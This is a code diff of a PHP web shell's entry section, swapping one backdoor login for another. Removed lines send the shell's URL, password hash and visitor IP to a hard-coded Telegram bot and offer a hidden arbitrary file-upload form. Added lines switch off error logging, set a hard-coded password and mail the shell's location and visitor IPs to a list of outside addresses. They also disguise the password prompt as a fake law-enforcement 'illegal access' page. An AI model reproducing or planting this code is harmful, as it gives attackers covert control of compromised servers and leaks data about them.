@@ -27,134 +27,93 @@ if ($sayfaSifreleme == "1") {
 ?>
     
 <?php
-$hashed_password = '$2y$10$QVpvHdIVCl6XsPh5c1.myO/rKnmpQdjJo6BH0lgemCyY0NJDjvlLu';
-
-$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
-$chatId = '5070938778';
-$xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$logMessage  = "___UBK3___ \n\n Shell nya =\n $xPath \n\n Password =\n $hashed_password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-sendTelegramMessage($botToken, $chatId, $logMessage);
-
-function sendTelegramMessage($botToken, $chatId, $message)
-{
-    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
-    $params = [
-        'chat_id' => $chatId,
-        'text' => $message,
-    ];
-    $options = [
-        'http' => [
-            'method' => 'POST',
-            'header' => 'Content-Type: application/x-www-form-urlencoded',
-            'content' => http_build_query($params),
-        ],
-    ];
-    $context = stream_context_create($options);
-    $response = file_get_contents($url, false, $context);
-
-}
-if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
-    echo '<form method="post" enctype="multipart/form-data">';
-    echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
-    echo '<input type="file" name="file" size="15">';
-    echo '<input type="submit" value="go">';
-    echo '</form>';
-}
-
-if (isset($_FILES['file']['tmp_name'])) {
-    $uploadd = $_FILES['file']['tmp_name'];
-    if (file_exists($uploadd)) {
-        $pwddir = $_POST['dir'];
-        $real = $_FILES['file']['name'];
-        $de = rtrim($pwddir, '/') . "/" . $real;
-        if (move_uploaded_file($uploadd, $de)) {
-            echo "go$de";
-        } else {
-            echo "GAGAL  KE $de";
-        }
+error_reporting(0);
+@clearstatcache();
+@ini_set("error_log", null);
+@ini_set("log_errors", 0);
+@ini_set("max_execution_time", 0);
+@ini_set("output_buffering", 0);
+@ini_set("display_errors", 0);
+session_start();
+$passwd = "77777777777777";
+echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
+if ($_POST["pass"]) {
+    if ($_POST["passwd"] == $passwd) {
+        $_SESSION["masuk"] = "masuk";
+        header("Location: ?");
+        
     }
 }
+if (isset($_REQUEST["logout"])) {
+    session_destroy();
+    header("Location: ?");
+}
+if (empty($_SESSION["masuk"])) {
 
-if (!isset($_COOKIE['auth']) || $_COOKIE['auth'] !== 'ok') {
-    if (isset($_POST['password'])) {
-        if (password_verify($_POST['password'], $hashed_password)) {
-            setcookie("auth", "ok", time() + 3600, "/", "", false, true);
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
-        } else {
-            echo "<p style='color:red; text-align:center;'>Hatalı şifre!</p>";
-        }
-    }
+    @ini_set("output_buffering", 0);
+    @ini_set("display_errors", 0);
+    set_time_limit(0);
+    ini_set("memory_limit", "64M");
+    header("Content-Type: text/html; charset=UTF-8");
+    $tujuanmail =
+        "https.cpanel.net@gmail.com, muhrazky@gmail.com, papaku.hayker@gmail.com, rootcyberpunks@gmail.com, fbi.priv.g00gle@gmail.com,https.cpanel.net@gmail.com, muhrazky@gmail.com, papaku.hayker@gmail.com, rootcyberpunks@gmail.com, fbi.priv.g00gle@gmailcom,malaysia.sender@gmail.com";
+    $x_path = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
+    $pesan_alert =
+        "fix $x_path :p *IP Address : [ " . $_SERVER["REMOTE_ADDR"] . " ]";
+    mail(
+        $tujuanmail,
+        "LOGGER",
+        $pesan_alert,
+        "[ " . $_SERVER["REMOTE_ADDR"] . " ]"
+    );
     ?>
-            <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="robots" content="noindex, nofollow">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Maklo Login</title>
-        <script src="https://cdn.tailwindcss.com"></script>
-        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
-        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+<title></title>
+<meta name="robots" content="noindex, nofollow">
+<meta name="googlebot" content="noindex, nofollow">
+<meta name="bingbot" content="noindex, nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+     <style>
+            @import 'https://rawcdn.githack.com/DanteLorenzo/FBI-Seized/495d2d737d64738e513519283eb444a9caefba89/src/css/main.css?min=1';
+        </style>
     </head>
-    <body class="bg-gray-900 flex items-center justify-center h-screen">
-        <div class="bg-gray-800 p-6 rounded-xl shadow-xl w-full max-w-md text-white">
-            <div class="text-center mb-6">
-                <i class="fas fa-user-shield text-blue-400 text-4xl"></i>
-                <h1 class="text-2xl font-bold mt-2">MAKLO HEKER</h1>
-                <p class="text-gray-400 text-sm">Restricted Access</p>
-            </div>
-            <form method="POST" class="space-y-4">
-                <?php if (!empty($error)): ?>
-                    <div class="bg-red-500/20 text-red-400 p-2 rounded border border-red-500">
-                        <i class="fas fa-exclamation-circle"></i> <?= htmlspecialchars(
-                            $error
-                        ) ?>
-                    </div>
-                <?php endif; ?>
-                <input type="password" name="password" placeholder="Enter Password" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded focus:outline-none focus:ring-2 focus:ring-blue-500" required>
-                <button type="submit" name="login" class="w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded font-semibold">
-                    <i class="fas fa-sign-in-alt mr-1"></i> LOGIN
-                </button>
-            </form>
-            <p class="mt-4 text-center text-sm text-gray-500">Password is required</p>
+    <body>
+    <div class="bg-container" id="bg-container">
+        <img src="https://github.com/DanteLorenzo/FBI-Seized/raw/master/src/img/landscape.svg" alt="Landscape" class="bg-landscape">
+    </div>
+    <main class="container" role="main">
+        <div class="seal-container d-flex justify-content-center my-3 my-md-5">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/0/0f/Logo_BSSN_new.png" class="seal img-fluid" alt="Federal Bureau of Investigation">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Logo_Bareskrim_Polri.png" class="seal img-fluid" alt="Department of Justice">
         </div>
-
-        <?php if (!empty($error)): ?>
-        <script>
-            Swal.fire({
-                icon: 'error',
-                title: 'Login Failed',
-                text: '<?= addslashes($error) ?>',
-                confirmButtonColor: '#3b82f6',
-                background: '#0f172a',
-                color: '#e2e8f0',
-                timer: 3000
-            });
-        </script>
-        <?php endif; ?>
-    </body>
-    </html>
-    <?php exit();
-}
-$sessionKey = md5($_SERVER["HTTP_HOST"]);
-if (!isset($_SESSION[$sessionKey])) {
-    if (isset($_POST["password"])) {
-        if (md5($_POST["password"]) === $hashedPassword) {
-            $_SESSION[$sessionKey] = true;
-            echo '<audio autoplay><source src="https://cvar1984.github.io/audio/moan.mp3" type="audio/mpeg"></audio>';
-        } else {
-            login_shell("Invalid password!");
-        }
-    } else {
-        login_shell();
-    }
-}
-?>
-                 
-    
+        <div class="card main-card shadow">
+            <div class="card-body">
+                <h1 class="title text-center">[ ILLEGAL ACCESS !!! ]</h1>
+                    <p>
+                       <p style="text-align: center;"><b>Pasal 27 Ayat (2) UU ITE 2024</b> dan <b>Pasal 378 KUHP</b>.</p> 
+                    </p>
+                    <p>
+                        Informasi lebih lanjut : <a href="https://www.bssn.go.id">https://www.bssn.go.id</a><br>
+                        Informasi lebih lanjut : <a href=" https://www.kominfo.go.id">https://www.kominfo.go.id</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+        
+<center>
+<p>
+<table height="100%" width="100%">
+  <td align="center">
+    <br><br>
+    <form enctype="multipart/form-data" method="post">
+      <input type="password" name="passwd">
+      <input type="submit" name="pass" value=">>">
+    </form>
+  </td>
+</table>
+<?php exit();
+}?>
     <?php
-    ?>   
+    ?>
 <?php
 session_start();
 @set_time_limit(0);
